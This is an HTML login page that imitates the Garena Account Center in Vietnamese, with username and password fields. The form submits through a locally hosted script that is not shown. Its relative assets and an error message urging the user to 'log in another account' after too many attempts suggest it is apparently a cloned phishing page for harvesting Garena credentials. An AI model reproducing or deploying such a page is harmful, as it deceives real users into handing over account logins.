<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
    <meta name="description" content="Garena Account Center" />
    <link rel="icon" href="/media/garena-icon.ico" />
    <title>Garena Account Center</title>
    <link rel="stylesheet" href="css/login-garena.css" />
    <link rel="stylesheet" href="css/topbar.css" />
  </head>
  <body>
    <div class="app">
      <header class="topbar">
        <div class="container">
          <a href="http://www.garena.vn" class="logo">
            <img src="/media/logo.svg" alt="Garena Logo" />
          </a>
          <select class="lang">
            <option value="vi-VN" data-v-878436c2="">Việt Nam - Tiếng việt</option>
            <option value="en-US" data-v-878436c2="">International - English</option>
            <option value="en-SG" data-v-878436c2="">Singapore - English</option>
            <option value="zh-SG" data-v-878436c2="">新加坡 - 简体中文</option>
            <option value="zh-TW" data-v-878436c2="">台灣 - 繁体中文</option>
            <option value="en-PH" data-v-878436c2="">Philippines - English</option>
            <option value="th-TH" data-v-878436c2="">ไทย - ไทย</option>
            <option value="id-ID" data-v-878436c2="">Indonesia - Bahasa Indonesia</option>
            <option value="ru-RU" data-v-878436c2="">Россия - Русский</option>
            <option value="en-MY" data-v-878436c2="">Malaysia - English</option>
            <option value="pt-PT" data-v-878436c2="">Portugal - Português</option>
            <option value="es-ES" data-v-878436c2="">España - Español</option>
          </select>
        </div>
      </header>
      <main>
        <form method="post" onsubmit="submitForm(event)">
          <h2>Đăng nhập</h2>
          <div class="field required">
            <input
              type="text"
              placeholder="Tài khoản Garena, Email hoặc số điện thoại"
              name="account"
              id="account"
            />
            <p id="login-account-error" class="msg-error d-none">Nhập tên tài khoản hoặc email</p>
          </div>
          <div class="field required">
            <input type="password" placeholder="Mật khẩu" name="password" id="password" />
            <p id="login-pass-error" class="msg-error d-none">Nhập mật khẩu</p>
          </div>
          <a class="forgot" href="https://account.garena.com/recovery">Quên mật khẩu? </a>
          <div class="field">
            <button class="primary" type="submit">Đăng Nhập Ngay</button>
            <p id="login-error" class="msg-error d-none">
              Đăng nhập thất bại: sai tên tài khoản hoặc mật khẩu
            </p>
            <p id="login-error-many" class="msg-error d-none">
              Đã quá số lần đăng nhập. Vui lòng đăng nhập tài khoản khác
            </p>
          </div>
          <div class="field">
            <button class="secondary register" type="button" onclick="bntRegister()">
              Tạo tài khoản mới
            </button>
          </div>
        </form>
      </main>
    </div>

    <!-- javascript -->
    <script src="js/login-garena.js"></script>
  </body>
</html>
